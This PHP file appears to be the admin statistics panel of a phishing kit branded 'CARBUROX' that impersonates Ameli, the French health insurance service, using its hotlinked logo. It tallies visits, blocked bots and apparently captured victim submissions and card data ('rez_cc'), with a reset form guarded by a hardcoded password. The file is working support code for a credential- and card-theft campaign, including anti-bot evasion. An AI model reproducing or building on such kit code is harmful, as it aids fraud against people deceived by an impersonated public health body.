<?php

$filepath = './stats.ini';
$data = @parse_ini_file($filepath);

if(isset($_POST['reset'])) {
	if($_POST['pass'] == "v9") {
	$data['visites'] = 0;
	$data['blocked_bots'] = 0;
	$data['rez_firstpage'] = 0;
	$data['rez_cc'] = 0;

	   function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === "submit"){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
            update_ini_file($data, $filepath);

            
} else {
	die("NIKEK OMOK");
}


}
?>

<html>
  <head>
    <title>CARBUROX Statistiques</title>
    <meta charset="utf-8"/>
    <meta name="robots" content="noindex"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
      body { text-align: center; padding: 20px; font: 20px Helvetica, sans-serif; color: #efe8e8; }
      @media (min-width: 768px){
        body{ padding-top: 150px; }
      }
      h1 { font-size: 50px; }
      article { display: block;  max-width: 650px; margin: 0 auto; }
      a { color: #dc8100; text-decoration: none; }
      a:hover { color: #efe8e8; text-decoration: none; }

      #statsfull {
    display: flex;
    justify-content: center;
}

    </style>
  </head>
  <body bgcolor="black">
    <center>
 
        <h1>STATS PANEL | AMELI V9</h1>
        <img src="https://rapport-annuel.assurance-maladie.fr/cpam-essonne/assets/other/images/footer_logo_ameli.png" width="300px" /><br></br><br></br>
        <div id="statsfull">
        <div id="visits">
            <h3>Visites&nbsp;&nbsp;</h3><br>
            <?php echo $data['visites']; ?>
        </div>
        <div id="bots">
            <h3>Bots&nbsp;&nbsp;</h3><br>
            <?php echo $data['blocked_bots']; ?>
        </div>
        
</div>

  </body><br></br><br></br><br></br>
  <footer>
  <form action="" method="POST">
	<input type="text" name="pass" placeholder="PASSWORD">
	<input type="submit" name="reset" value="RESET STATS">
  
</form>
</footer>
    </center>
</html>